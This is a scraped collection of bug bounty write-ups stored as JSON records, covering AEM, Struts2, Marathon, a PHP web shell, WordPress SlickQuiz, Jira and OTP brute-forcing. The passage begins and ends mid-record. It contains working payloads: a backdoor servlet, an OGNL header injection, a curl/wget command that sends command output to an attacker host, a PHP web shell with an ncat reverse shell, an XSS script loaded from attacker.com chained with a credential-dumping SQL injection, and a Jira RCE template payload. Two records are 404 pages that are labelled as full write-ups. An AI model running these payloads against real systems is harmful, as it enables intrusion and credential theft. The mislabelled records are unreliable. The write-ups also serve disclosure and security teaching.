navigated to https://example.org/system/console/bundles , pressed “Install/Update…” button and uploaded created jar file with enabled “Start Bundle” checkbox. At console I already saw that installation was successful and backdoor was accessible at defined in servlet path. https://example.org/bin/backdoor?cmd=id uid=1004(publish) gid=1004(publish) groups=1004(publish) After identification of RCE I deleted uploaded bundle from AEM and reported issue to vendor. In a few hours I got first reply from triage team, which marked my submission as “Not applicable” because it was out of scope. Sad, but it’s a common case in bug bounty. Anyway I got great experience of exploitation of such things and spent my time not in vain. And probably it should be the end of the story, but exactly one month later I got notification from Bugcrowd with following content: okay. Vendor accepted this due to the severity even as it was out-of-scope. Rightly. P.S. Thanks to Peter Adkins (Darkarnium) , Mikhail Egorov ( 0ang3el ) and my PHP expert colleague. References: Remote Code Execution (RCE) on Microsoft's 'signout.live.com' TL;DR: The combination of a less than great vulnerability handling processes by Adobe, and the use of default… www.kernelpicnic.net AEM hacker - Approaching Adobe Experience Manager Web Apps | Bugcrowd Adobe Experience Manager (AEM) is an enterprise-grade CMS and is quite popular among high-profile companies. There are… www.bugcrowd.com 0ang3el/aem-hacker Tools to identify vulnerable Adobe Experience Manager (AEM) webapps. AEM is an enterprise-grade CMS. I built these… github.com 0ang3el/aem-rce-bundle OSGI bundle allows to get RCE when you have access to Felix Console. There is pre-build bundle… github.com Java Adobe Experience Manager Bug Bounty Remote Code Execution Bugcrowd -- -- Written by byq 328 followers · 5 following https://twitter.com/ByQwert No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6", "title": "How I got 5500$ from Yahoo for RCE | by Th3G3nt3lman | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/how-i-got-5500-from-yahoo-for-rce-92fffb7145e6. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I got 5500$ from Yahoo for RCE | by Th3G3nt3lman | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication How I got 5500$ from Yahoo for RCE Th3G3nt3lman 2 min read · Jun 4, 2017 -- 13 Listen Share Hi Guys, I always believed that sharing is caring, and i have been learning from multiple security researchers in the bug bounty field, so i decided to share my few findings with you as it might help others who started in the Bug Bounty journey. As you already know few months back a critical venerability have been discovered in apache Struts2 (CVE-2017–5638) leads to a remote code execution, the easy exploit for the same have been published and a lot of web applications were getting exploited in massive way. After almost 3 weeks of the Struts2 exploit being published and during my Recon process i came across this link: https://svdevems01.direct.gq1.yahoo.com/sm/login.jsp which is a login page for the selligent Messages studio solution used by yahoo. Press enter or click to view image in full size Tried to find vulnerabilities there and i failed until i found this endpoint : https://svdevems01.direct.gq1.yahoo.com/sm/login/loginpagecontentgrabber.do , for those who don't know if you find endpoints with .action, .do , .go that means the web application running struts2. So as i said the exploit was published and easy to use but also it didn't work for this target even though it was confirmed that its vulnerable, that means there was WAF or something blocking my attacks. I couldn't stop here as its vulnerable and for reporting it i have to provide a valid POC for the same, After some searches i found a twitter post with a payload that can bypass WAF to exploit this vulnerability. The detection method i found makes use of the Content-Type HTTP header to send a specially crafted packet. The header is shown below: Content-Type: %{#context[‘com.opensymphony.xwork2.dispatcher.HttpServletResponse’].addHeader(‘X-Ack-Th3g3nt3lman-POC’,4*4)}.multipart/form-data The new request asks the web server to multiple two numbers and can be used to request the web server to perform any other operation. In the example above the two numbers are 4 and 4 . and the answer from the web server, was 16 which concluded that the server is vulnerable. The response as per the below picture will contain the new header X-Ack-Th3g3nt3lman-POC: 16 Press enter or click to view image in full size That was fair enough to report the bug for yahoo through hackerone, Yahoo Triaged the report within 30 minutes, took the application offline to fix the issue and i confirmed the fix after that, within a week i was awarded with 5500$ for this finding. Hope You liked this finding and i apologize for my weak English if there is any mistakes in this post. Security Bug Bounty Yahoo -- -- 13 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Th3G3nt3lman 2.7K followers · 3 following Security Researcher / Bug Bounty Hunter / https://twitter.com/Th3G3nt3lman Responses ( 13 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/", "title": "WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” – @omespino", "friendly_explanation": "This is a bug bounty writeup from https://omespino.com/write-up-private-bug-bounty-usd-rce-as-root-on-marathon-instance/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” – @omespino Skip to content Menu BLOG EN ESPAÑOL @omespino just another security blog. Written by omespino August 27, 2019 January 7, 2022 WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about why your professional background mather when you do bug bounties (in my case my job as DevOps engineer) if you know how something works, you might be able to break it. This blogpost appeared first in the book Bug Bounty Write Ups Collection Report Summary: Hi team I i’ve found that some of your Marathon intances are vulnerablte to RCE as root Description and impact: Marathon is a production-grade container orchestration platform for Mesosphere’s Datacenter Operating System (DC/OS) and Apache Mesos . So, since Marathon is a orchestration platform for mesos, that means that you can schedule tasks to be performed whatever you want, per example a simple bash command (pretty similar to cronjobs) Steps To Reproduce: One day I just was navigating in shodan and I don’t know why I thought about the Marathon service (As DevOps engineer, in one of my activities I needed to set up some Marathon/Mesos/Spark instances), that made me think about which companies have Marathon instances activated without any authentication in production environments, so I decided to try with some dorks in shodan (like “SSL: Redacted” “X-Marathon-Leader”) when suddenly some wild server appear: I thought WOW! Marathon instances with HTTP/1.1 200 OK responses, it is not a guarantee, but 90% of the times, a 200 response on Marathon UI means that you have access without any kind of authentication needed Extracted from the report: Hi Sec team here is the POC 1.- Go to https://XXX.XXX.XXX.XXX/ ui/#/apps and see the Marathon’s Dashboard and the application list (without any authentication needed): 2.- then set your own server listening with netcat with the following command: #set your own server to wait the response root@h0st:~# nc -lvvv 55555 3.- then create a Marathon application that will be execute the RCE command with the following curl command: # create a marathon application that will be execute any command that you want (in this case is /usr/bin/wget --user-agent=marathon-id --post-data=`id`) # replace attacker_server with your listening server that you set up with netcat and the \"rce-id\" tag with your own custom tag, this is the Marathon application name root@h0st:~# curl -sk -X POST -H \"Content-type: application/json\" https://XXX.XXX.XXX.XXX/v2/apps -d '{ \"mem\": 16, \"id\": \"rce-id\", \"cmd\": \"/usr/bin/wget --user-agent=marathon-id --post-data=`id` attacker_server:55555\"}' 4.- Then go to https://XXX.XXX.XXX.XXX/ui/#/apps again and see the application created named “rce-id” that we just created with curl, and wait some seconds and recieve the command from the Marathon Instance and the command output PS. after that I deleted immediately the rce-id aplication from Marathon UI Tools: netcat, curl and any browser Is this bug public or known by third parties? No Can I reproduce this issue every time? Yes How did I find this bug? via shodan. well that’s it, if you have any doubt, comment or sugestion just drop me a line here or in twitter @omespino , read you later. Facebook Tweet LinkedIn Shares 713 2 thoughts on “ WRITE UP – Private bug bounty $$,$$$ USD: “RCE as root on Marathon-Mesos instance” ” Greggflert says: October 14, 2019 at 8:30 pm Интересно! Reply omespino says: October 16, 2019 at 1:47 am спасибо за чтение! Reply Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name Email Website Post navigation Previous Post WRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD Next Post WRITE UP – [Google VRP Prize update] GOOGLE BUG BOUNTY: XSS to Cloud Shell instance takeover (RCE as root) – $5,000 USD @OMESPINO BLOG EN ESPAÑOL"}
{"source_url": "https://blog.zsec.uk/rce-starwars/", "title": "May the Shells be with You - A Star Wars RCE Adventure!", "friendly_explanation": "This is a bug bounty writeup from https://blog.zsec.uk/rce-starwars/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMay the Shells be with You - A Star Wars RCE Adventure! About Andy Gill/ZephrFish Pre-register for my course My Books LTR101 Posts Photo Blog Pre-register for my course Sign in Subscribe bugbounty May the Shells be with You - A Star Wars RCE Adventure! Andy Gill 22 Jul 2017 • 7 min read Intro Continuing the non- ltr101 posts for a second here is a quick write-up of a cool bug I found recently on a bounty program. It features Remote Code Execution via an abandoned web service. Enabling me to traverse the target internal network and gain access to some juicy data. Now it's not often that I manage to find bugs let alone cool ones to write about so hopefully this post is enjoyable to read. If you can't be bothered reading the tl;dr is I got RCE via a PUT method and turned this into trawling an internal network similar to a red teaming exercise. NOTE : Finding PUT method available unauthenticated is very uncommon these days however it is still worth looking for. Your Subdomain is called what?! It all started with the usual recon, look at sub-domains, resolve to IPs then look at ports. However this time around I found a weird hostname with an application running on port 64351 , not your average web port granted most would find it with a full port scan anyway. The domain was similar to (haven't listed the company for confidentiality reasons): fast.force.staging.intcorp.yoda.domain.com Starting out it popped out to me for a few reasons: It was the only domain with anything other than admin, vpn, email etc in it Mention of intcorp peeked my interest It's not your average sub-domain length fast force staging int corp yoda is a bit random too! So off I went, resolved the domain. Bingo we have an IP, however browsing to just he domain returned nothing, enter le port scan via nmap: nmap -sTV -p- -Pn --max-retries 3 fast.force.staging.intcorp.yoda.domain.com --version-all -oA UsethePowa A little while later the port scan result came back: Starting Nmap 7.50 ( https://nmap.org ) at 2017-06-29 22:47 BST Nmap scan report for fast.force.staging.intcorp.yoda.domain.com (x.x.x.x) Host is up (0.082s latency). Not shown: 979 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 25/tcp closed smtp? 80/tcp closed http 81/tcp closed hosts2-ns 90/tcp open http? 64351/tcp open http 2 services unrecognised despite returning data. Initial identification was made based upon some weird looking files I found in the application's web root on port 64351 each containing phpinfo files however with varying names. Now the usual way to get files there would be via some form of file upload etc. However in this case I couldn't find anything that looked remotely like a file upload, instead going back to real old school attack enter HTTP Methods. HTTP Verbs/Methods A quick tl;dr on HTTP Verbs/Methods, they are essentially the way in which a request is issued to a server or application. The two most commonly used are GET & POST for downloading and uploading data to an application. In this case I send an OPTIONS request to the server on port 64351 to find out what methods were allowed. The response indicated that the application accepted GET , POST , HEAD & PUT . The first three are pretty common however the PUT request is uncommon and the exploit path to upload is even more uncommon. PUT I managed to use PUT to write files to a folder in the webroot called test , upon doing this I was able to write any files I wanted, I assumed this was the way those phpinfo files got there in the first place. A quick look around with the web shell found me the phpinfo files again: So by utilising the PUT method I uploaded a simple PHP web shell, the code of which can be found below: <?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>$cmd<pre>\"; die; } ?> It takes commands from the ?cmd parameter and executes system commands from there. The PUT request was successful and Bingo a shell was achieved, all be it a web shell: May the Shell be with you! However I wanted more freedom within this environment to explore. Enter some OSCP nostalgia, turning a web shell into a reverse shell with netcat. On a lot of hosts you'll be lucky if you have access to netcat let alone ncat ! This server appeared to have access to both which was a lucky day for me! Using the line below I was able to connect to a listener I'd setup and start to explore more. I spent ages trying to get a port to connect out on but finally settled for 443 as the server was allowing access out over that port. Command from webshell: ncat -e /bin/bash ATTACKERHOST 443 Listener Server Side: ncat -l -v -p 443 Issuing the command from the webshell threw me a nice connect back from the app, at this point I was shaking with excitement! RCE, a web shell now a reverse shell, it's like it was meant to be! However thinking back to OSCP it's always nice to have a full bash shell, so with one python one-liner I had an interactive bash shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Digging Deeper So at this stage, I decided to have a poke around the OS and see what I could find with my newly acquired interactive shell. Quickly I found some very juicy looking directories within a folder in /tmp/CorpNet . This folder contained three other folders: CorpVPNKeys CorpZT CitrixCorp Digging within these folders yielded some very useful files including one file containing an internal Zone Transfer of the entire domain. Finding other hosts Using the information within the zone transfer files, I identified internal hostnames that looked similar to the original host I'd already discovered including: staging.intcorp.jawa.domain.com 10.0.1.1 staging.internal.sith.domain.com 10.0.1.3 internal.vader.domain.com 10.2.1.13 Looks like the sysadmin of this network is a star-wars fan! There were many other hosts that shared the star-wars naming scheme. I decided at this stage it was time to do some port scanning given the host had access to ncat & nmap . I leveraged these to scan the range 10.0.1.0/24 seeking out other interesting hosts. A quick nmap -F 10.0.1.0/24 , brought back some really interesting ports including a machine with what looked to be a tonne of open windows ports: 3389,445,135,137,1433,2433 . Bearing in mind this is an internal network having RDP & SMB open is not unheard of. However as I was limited to what I could use on the box I turned to nmap's scripting engine to see if it would pick up anything. Alas the version of nmap on the compromised box didn't support nmap scripting so that was out :-(. At this stage I decided to alert the company of the issue I'd discovered and asked if I could continue to dig at the machine, I received a very quick reply stating: \"Thanks for alerting us, please see how far you can get in the network, we're fairly sure the network internally is secure\" . Given the 'fairly sure the network internally is secure' statement, I felt I was up for the challenge. Challenge Accepted The next step was seeing if I could traverse the network as I had no hashes or passwords for users. A quick cat of the passwd file showed a user called emperor with an interesting UID .: emperor:x:0:1002:SPalpatine:/home/emperor:/bin/bash Now relating back to the star-wars hostnames, this user also appears to be a star-wars reference, notice the UID appears to be for the root user. However still no password, notice the text between the GID and the home directory... SURELY THAT CAN'T BE THE PASSWORD... At this stage I couldn't believe my luck, root! Now the only natural thing to do was to see if I could log into other machines with the same creds, given there were several hosts on the internal network with SSH open I tried to connect to them with the emperor user. Extra Bonus Of the interesting hosts identified earlier I was able to connect to internal.vader.domain.com with the emperor user who also had root privs on this box too. I was able to dump the hashes from this box and crack them, additionally I discovered the root private key which was used as a master key for signing the VPN certs discovered on the original box. At this stage I wrote up all of my findings and reported to the company under several issues in one report: Remote Code Execution via HTTP Method & Poor Directory Permissions Sensitive Files stored on file system readable by all Password disclosed in /etc/passwd for a root user Weak Hashing algorithm in /etc/shadow Closing Notes Take aways from this, well the single issue here was poor directory permissions and authentication issues allowing me to upload the initial web shell. However what it does outline is that if you persist with something it can reveal some very fruitful findings. Other take-aways from this are sysadmins, be careful with your naming schemes don't make your passwords related to the hostname or users as it can be dangerous. The company have since patched this issue and thanked me for writing up the entire thing for them. Further Reading HTTP Methods Web Shells Explained How to Google Exploiting PUT Methods Featured Expanding on ChunkyIngress - Clippy Goes Rogue (GoClipC2) GoClipC2: A covert Windows clipboard-based C2 channel for VDI/RDP environments. Bypasses network monitoring with encrypted Base64 messaging. 15 Jun 2025 10 min read The Human Element: Why AI-Generated Content Is Killing Authenticity They say AI is the future, but what they meant was Andy Intelligence. 31 May 2025 4 min read Featured LOLCLOUD - Azure Arc - C2aaS Exploring Azure Arc’s overlooked C2aaS potential. Attacking and Defending against its usage and exploring usecases. 30 May 2025 12 min read ZephrSec - Adventures In Information Security © 2025 About Andy Github Twitter LinkedIn Photo Blog Pre-register MAE Powered by Ghost"}
{"source_url": "https://medium.com/@karthiksoft007/oculus-identity-verification-bypass-through-brute-force-dbd0c0d3c37e", "title": "Oculus identity verification bypass through brute-force | by Karthik Kumar Reddy | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@karthiksoft007/oculus-identity-verification-bypass-through-brute-force-dbd0c0d3c37e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nOculus identity verification bypass through brute-force | by Karthik Kumar Reddy | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Oculus identity verification bypass through brute-force Karthik Kumar Reddy 2 min read · Sep 9, 2019 -- Listen Share Title brute froce attack near verify your identity and bypass identity verification Oculus is avery secure web application which doesnt have any vulnerability but i found some that which has lack of rate limit near identity verification The identity has been used in oculus near username parameter what that means whenever the user wants to change the username of the user account then user needs to be done this identity verification. How this identity verification works in oculus. Whenever the user wants to change the username the OTP will be sended to the registered mail of the user. Now the OTP is in 6digit number Steps to reproduce : 1)login to oculus 2)goto profile and change username 3)Oculus sends the 6-digit verification code to user through gmail 4)and for testing i have entered wrong code 5)actually the code is 483967 i have entered 486960 6)And captured that request in burpsuit now added 486960 7)And given payloads from 482000=>483970 total 1,971 payloads and started attack 8)At 483967 the length of the code is different all invalid payloads code=>1152,valid=>840 9)Now by seeing length i have confirmed it is the correct payload.that is same payload i got in mail for identity verification Poc :: https://drive.google.com/file/d/1MPZSY_yB_dayKvXCur2zxDV_Y5tc01f3/view?usp=sharing Reported on :28/may/2019 Triged on : 12/jun/2019 Rewarded on :9/july/2019 NOTE : i have awarded from facebook three times. I’ll post that remaining two reports ASAP Security Brute Force Attack Penetration Testing -- -- Written by Karthik Kumar Reddy 259 followers · 3 following Bug bounty hunter | Web application security | Memory forensics | SIEM | Network security | DevSecOps |Top Recognized in Cisco PSIRT No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4", "title": "BugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 | by Akash Agrawal | devopsenthusiasm | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/clouddevops/bugbounty-how-i-cracked-2fa-two-factor-authentication-with-simple-factor-brute-force-a1c0f3a2f1b4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 | by Akash Agrawal | devopsenthusiasm | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in devopsenthusiasm · devopsenthusiasm BugBounty: How I Cracked 2FA (Two-Factor Authentication) with Simple Factor Brute-force !!! 😎 Akash Agrawal 3 min read · Nov 8, 2019 -- 2 Listen Share Today I would like to share how I was able to bypass OTP (One Time Password) login with a simple brute force attack on India’s biggest travel service provider. OTP is treated as an additional measure for security termed as 2FA. For those who don't know about, what is 2FA? Two-factor authentication (2FA) , sometimes referred to as two-step verification or dual factor authentication, is a security process in which the user provides two different authentication factors to verify themselves to better protect both the user’s credentials and the resources the user can access. Generally, OTP is a combination of 4 digits starting from 0000 to 9999. If we count there 10,000 combinations. In the age of powerful computer 10,000 combinations take only a few minutes to process. If OTP verification is not properly managed, anyone can bypass this with a simple brute force. Why I was able to bypass the 2FA? No rate limiting on an unsuccessful attempt No new OTP policy on X unsuccessful attempt Few prerequisites: Web Browser Burp Suite Now let's see how I was able to bypass the 2FA with burp suite:- Step 01: Logged into the website using the mobile number and entered the wrong OTP to intercept on burp suite Press enter or click to view image in full size Pannel to enter the OTP received on the Mobile Number Press enter or click to view image in full size Intercept the Verify OTP API call on Burp Suite Step 02: Sending the verifyOTP API call to the intruder. Press enter or click to view image in full size Image showing the Dialogue box to send intruder. Press enter or click to view image in full size Intruder Screen Burp Suite Step 03: Selecting the OTP placeholder and add it for simple brute force. Press enter or click to view image in full size Intruder screen with OTP placeholder selected for brute force Step 04: Select the Payload tab, changed the payload type to Numbers and change the payload options as desired and clicked on the attack. Press enter or click to view image in full size Payload Screen: For setting payload desired options Press enter or click to view image in full size Brute Force In Progress Step 05: As the brute force was in progress I could see length for one of the OTP value is changed from 617 to 2250. Lets check: Press enter or click to view image in full size OTP Response Step 06: Boom !!! I was able to get the login token and was able to log in. Press enter or click to view image in full size Details of successful login Hence, The simple brute force was successful. Security Devsecops -- -- 2 Published in devopsenthusiasm 23 followers · Last published Jul 17, 2020 devopsenthusiasm Written by Akash Agrawal 120 followers · 6 following A computer geek, lover of programming and learner is how I would simply define myself. To challenge myself in field in Computers and Cyber Security. Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://rhys.io/post/rce-in-ruby-using-mustache-templates", "title": "@rhyselsmore", "friendly_explanation": "This is a bug bounty writeup from https://rhys.io/post/rce-in-ruby-using-mustache-templates. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n@rhyselsmore Skip links Skip to primary navigation Skip to content Skip to footer @rhyselsmore Posts About Toggle menu 404 Page not found :( The requested page could not be found. Feed © 2022 @rhyselsmore. Powered by Jekyll & Minimal Mistakes ."}
{"source_url": "https://whitehatnepal.tumblr.com/post/149933960267/rce-in-addthis", "title": "Not found.", "friendly_explanation": "This is a bug bounty writeup from https://whitehatnepal.tumblr.com/post/149933960267/rce-in-addthis. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot found. There's nothing here. Whatever you were looking for doesn't currently exist at this address. Unless you were looking for this error page, in which case: Congrats! You totally found it. Log in Sign up Search Log in Sign up"}
{"source_url": "https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/", "title": "H1-4420: From Quiz to Admin – Chaining Two 0-Days to Compromise An Uber Wordpress | RCE Security", "friendly_explanation": "This is a bug bounty writeup from https://www.rcesecurity.com/2019/09/H1-4420-From-Quiz-to-Admin-Chaining-Two-0-Days-to-Compromise-an-Uber-Wordpress/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nH1-4420: From Quiz to Admin – Chaining Two 0-Days to Compromise An Uber Wordpress | RCE Security Home About Contact Us Services Research Select Page H1-4420: From Quiz to Admin – Chaining Two 0-Days to Compromise An Uber WordPress by Julien Ahrens | Tuesday, September 10, 2019 | Bug Bounty | 0 comments TL;DR While doing recon for H1-4420, I stumbled upon a WordPress blog that had a plugin enabled called SlickQuiz . Although the latest version 1.3.7.1 was installed and I haven’t found any publicly disclosed vulnerabilities, it still somehow sounded like a bad idea to run a plugin that hasn’t been tested with the last three major versions of WordPress. So I decided to go the very same route as I did already for last year’s H1-3120 which eventually brought me the MVH title: source code review. And it paid off again: This time, I’ve found two vulnerabilities named CVE-2019-12517 (Unauthenticated Stored XSS) and CVE-2019-12516 (Authenticated SQL Injection) which can be chained together to take you from being an unauthenticated WordPress visitor to the admin credentials. Due to the sensitivity of disclosed information I’m using an own temporarily installed WordPress blog throughout this blog article to demonstrate the vulnerabilities and the impact. CVE-2019-12517: Going From Unauthenticated User to Admin via Stored XSS During the source code review, I stumbled upon multiple (obvious) stored XSS vulnerabilities when saving user scores of quizzes. Important side note : It does not matter whether “Save user scores” plugin option is disabled (default) or enabled, the pure presence of a quiz is sufficient for explotiation since this option does only disable/enable the UI elements. The underlying issue is located in php/slickquiz-scores.php in the method generate_score_row() (lines 38-52) where the responses to quizzes are returned without encoding them first: function generate_score_row( $score ) { $scoreRow = ''; $scoreRow .= '<tr>'; $scoreRow .= '<td class=\"table_id\">' . $score->id . '</td>'; $scoreRow .= '<td class=\"table_name\">' . $score->name . '</td>'; $scoreRow .= '<td class=\"table_email\">' . $score->email . '</td>'; $scoreRow .= '<td class=\"table_score\">' . $score->score . '</td>'; $scoreRow .= '<td class=\"table_created\">' . $score->createdDate . '</td>'; $scoreRow .= '<td class=\"table_actions\">' . $this->get_score_actions( $score->id ) . '</td>'; $scoreRow .= '</tr>'; return $scoreRow; } Since $score->name , $score->email and $score->score are use-controllable, a simple request like the following is enough to get three XSS payloads into the SlickQuiz backend: POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 165 DNT: 1 Connection: close action=save_quiz_score&json={\"name\":\"xss<script>alert(1)</script>\",\"email\":\"test@localhost<script>alert(2)</script>\",\"score\":\"<script>alert(3)</script>\",\"quiz_id\":1} As soon as any user with access to the SlickQuiz dashboard visits the user scores, all payloads fire immediately: So far so good. That’s already a pretty good impact, but there must be more. CVE-2019-12516: Authenticated SQL Injections To the Rescue The SlickQuiz plugin is also vulnerable to multiple authenticated SQL Injections almost whenever the id parameter is present in any request. For example the following requests: /wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a) /wp-admin/admin.php?page=slickquiz-edit&id=(select*from(select(sleep(5)))a) /wp-admin/admin.php?page=slickquiz-preview&id=(select*from(select(sleep(5)))a) all cause a 5 second delay: The underlying issue of i.e. the /wp-admin/admin.php?page=slickquiz-scores&id=(select*from(select(sleep(5)))a) vulnerability is located in php/slickquiz-scores.php in the constructor method (line 20) where the GET parameter id is directly supplied to the method get_quiz_by_id() : $quiz = $this->get_quiz_by_id( $_GET['id'] ); Whereof the method get_quiz_by_id() is defined in php/slickquiz-model.php (lines 27-35): function get_quiz_by_id( $id ) { global $wpdb; $db_name = $wpdb->prefix . 'plugin_slickquiz'; $quizResult = $wpdb->get_row( \"SELECT * FROM $db_name WHERE id = $id\" ); return $quizResult; } Another obvious one. Connecting XSS and SQLi for Takeover Now let’s connect both vulnerabilities to get a real WordPress takeover 🙂 First of all: Let’s get the essential login details of the first WordPress user (likely to be the admin): user’s email, login name and hashed password. I’ve built this handy SQLi payload to achieve that: 1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users-- This eventually returns requested data within an <h2> tag: With this payload and a little bit of JavaScript, it’s now possible to exploit the SQLi using a JavaScript XMLHttpRequest : let url = 'http://localhost/wordpress/wp-admin/admin.php?page=slickquiz-scores&id='; let payload = '1337 UNION ALL SELECT NULL,CONCAT(IFNULL(CAST(user_email AS CHAR),0x20),0x3B,IFNULL(CAST(user_login AS CHAR),0x20),0x3B,IFNULL(CAST(user_pass AS CHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM wordpress.wp_users--' let xhr = new XMLHttpRequest(); xhr.withCredentials = true; xhr.onreadystatechange = function() { if (xhr.readyState === XMLHttpRequest.DONE) { let result = xhr.responseText.match(/(?:<h2>SlickQuiz Scores for \")(.*)(?:\"<\\/h2>)/); alert(result[1]); } } xhr.open('GET', url + payload, true); xhr.send(); Now changing the XSS payload to: POST /wordpress/wp-admin/admin-ajax.php?_wpnonce=593d9fff35 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: */* Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 165 DNT: 1 Connection: close action=save_quiz_score&json={\"name\":\"xss\",\"email\":\"test@localhost<script src='http://www.attacker.com/slickquiz.js'>\",\"score\":\"1 / 1\",\"quiz_id\":1}on=save_quiz_score&json={\"name\":\"xss<script>alert(1)</script>\",\"email\":\"test@localhost<script src='http://www.attacker.com/slickquiz.js'>\",\"score\":\"1 / 1\",\"quiz_id\":1} Will cause the XSS to fire and alert the WordPress credentials: From this point on, everything’s possible, just like sending this data cross-domain via another XMLHttpRequest etc. Thanks Uber for the nice bounty! X RSS Designed by Elegant Themes | Powered by WordPress"}
{"source_url": "https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f", "title": "Two Easy RCE in Atlassian Products | by Valeriy Shevchenko | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@valeriyshevchenko/two-easy-rce-in-atlassian-products-e8480eacdc7f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTwo Easy RCE in Atlassian Products | by Valeriy Shevchenko | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Two Easy RCE in Atlassian Products Valeriy Shevchenko 4 min read · Aug 9, 2019 -- 2 Listen Share It was a long time from my last article. It was so many interesting results in my work. Seems that it's right time to share my knowledge and experience with you. But first, I wanna inform that two issues in that article well known. And both of that have CVE numbers with patches and software updates. So maybe you will be lucky to find old versions in your testing scope. And I don't want to make hype on that article as Avinash Jain with old Jira vulnerability in Shared filters . From my perspective, it's a shame to make such hype around a bug with a questionable impact which was known for a long time ago. Press enter or click to view image in full size 1. Jira Remote Code Execution in Contact Administrators form ( CVE-2019–11581 ) When it was discovered, I found first that video from Knownsec 404 team But from that time it was no POC for exploitation. But next, I found nice research from ruvlol where he discovered pretty well that the root of the problem in ContactAdministrators!default.jspa form. Also from his article, it was simple to understand that Knownsec 404 team was mistaken in numbers of affected instances. To find all public instances with such functionality you just need to search for : inurl:secure/ContactAdministrators!default.jspa So the exploitation process is very simple. Check from the dashboard page that your Jira instance supports Contact Administrator form. Press enter or click to view image in full size 2. Next, it's better to check the accessibility of that page from URL like: https://jira.example.com/secure/ContactAdministrators!default.jspa 3. Prepare your BurpCollaborator or your server for getting request as POC. I used ngrok tunnel. And fill in the contact form with that payload. $i18n.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’,null).invoke(null,null).exec(‘curl http://your-testing-server.com/rcetest?a=a').waitFor() That payload making just simple curl request to your server. Press enter or click to view image in full size 4. Confirm your results with getting a request from Vulnerable Jira environment. Press enter or click to view image in full size For this issue to be exploitable at least one of the following conditions must be met: an SMTP server has been configured in Jira and the Contact Administrators Form is enabled; or an SMTP server has been configured in Jira and an attacker has “JIRA Administrators” access. So now you know how to make such easy RCE attack in vulnerable Jira environment if your version is still vulnerable. You can check affected versions here . 2. Confluence Remote Code Execution via Widget Connector macro ( CVE-2019–3396 ) That fresh 